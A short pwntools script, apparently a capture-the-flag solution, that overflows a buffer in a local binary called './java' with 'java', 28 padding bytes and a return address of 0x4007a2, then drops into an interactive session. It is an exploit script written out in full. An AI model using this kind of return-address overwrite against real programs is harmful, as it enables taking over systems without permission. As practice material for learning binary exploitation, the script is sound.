from pwn import *

context.binary = "./java"

p = process()
payload = b"java"+b"A"*28+p64(0x00000000004007a2)
p.sendline(payload)
p.interactive()
